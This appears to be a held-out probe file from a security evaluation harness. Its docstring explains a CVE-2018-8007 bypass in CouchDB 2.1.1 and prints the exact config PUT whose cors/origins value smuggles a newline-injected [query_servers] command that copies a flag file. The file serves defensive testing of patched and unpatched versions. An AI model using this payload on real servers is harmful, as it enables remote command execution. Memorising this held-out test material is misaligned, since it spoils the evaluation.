#!/usr/bin/env python3
"""[HELD-OUT] CVE-2018-8007 residual exploit — config blacklist newline-injection bypass.

The CVE-2017-12636 fix (2.1.1) added couch_util:check_config_blacklist/1, which rejects a
PUT whose *section* is one of the command-execution sections (query_servers, os_daemons,
native_query_servers, daemons, ...). But the check only inspects the section NAME in the
request path; it never validates the VALUE. CouchDB persists config as `key = value` lines
in local.d/local.ini, so an admin can PUT a NON-blacklisted section (here `cors/origins`)
whose value contains newlines that break out into a fresh, blacklisted section:

    PUT /_node/nonode@nohost/_config/cors/origins
        "http://pcb.example\n\n[query_servers]\npcbqs = /bin/cp /flag/pcb_flag.txt /pcb_out/<f>\n"

check_config_blacklist sees section "cors" (allowed) -> 200. local.d/local.ini now contains
an injected `[query_servers] pcbqs = ...`. On the next CouchDB start that file is re-parsed
into the live config, so registering the query server + querying a view SPAWNS pcbqs -> the
flag is copied to /pcb_out. Same flag channel as the seed (query-server command exec) -> Variant A.

Contract:
  V1 (2.1.1 stock): the newline value is written verbatim -> [query_servers] injected ->
      command spawned -> flag copied. REACHES flag on the SAME channel the seed's 403 blocks.
  V2 (2.1.2, =CVE-2018-8007-patched): config:set now validates the value (commit 2cec527,
      string:trim + reject) and returns 400 "Invalid configuration value" -> nothing is
      written to local.d/local.ini -> no section is injected. BLOCKED (no flag).

The bypass relies on config PERSISTENCE surviving to the next CouchDB start, so the probe
restarts the target service after injecting (a legitimate persistence-triggered RCE primitive).

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations


def candidate() -> dict:
    """Request candidate for the CVE-2018-8007 residual (newline-injection blacklist bypass)."""
    return {
        "probe_id": "cve-2018-8007-cors-origins-newline-inject-query_servers",
        "mode": "newline_inject",    # PUT non-blacklisted cors/origins with an injected [query_servers]
        "carrier_section": "cors",   # blacklist-allowed section whose VALUE carries the injection
        "carrier_key": "origins",
        "outfile": "byp_residual.txt",
    }


if __name__ == "__main__":
    print(candidate())
